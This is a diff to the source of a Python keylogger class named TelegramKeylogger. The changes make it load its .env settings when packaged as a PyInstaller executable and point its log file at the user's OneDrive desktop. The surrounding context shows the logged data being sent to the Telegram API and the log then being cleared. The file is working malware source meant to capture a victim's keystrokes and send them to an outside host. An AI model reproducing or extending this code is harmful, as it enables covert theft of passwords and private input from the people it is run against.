@@ -1,11 +1,29 @@
 import io
 import os
+import sys
 import time
 import requests
 import getpass
 from dotenv import load_dotenv
 
-load_dotenv()
+
+def resource_path(folder, file):
+    """Get absolute path to resource, works for dev and for PyInstaller"""
+    try:
+        # PyInstaller creates a temp folder and stores path in _MEIPASS
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, folder, file)
+
+# dotenv_path = os.path.join(os.path.dirname(__file__), '.', 'data', '.env')
+
+# dotenv_path = resource_path('data/.env')
+dotenv_path = resource_path('data', '.env')
+load_dotenv(dotenv_path=dotenv_path)
+
+# load_dotenv()
 
 username = getpass.getuser()
 
@@ -45,12 +63,12 @@ class TelegramKeylogger:
                 open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'w').close()
                 return True
             else:
-                open("logfile.txt", 'w').close()
+                open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'w').close()
                 print(f"Telegram API error: {response.status_code}")
                 return False
 
         except Exception as e:
-            open("logfile.txt", 'w').close()
+            open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'w').close()
             print(f"Send error: {e}")
             return False
 
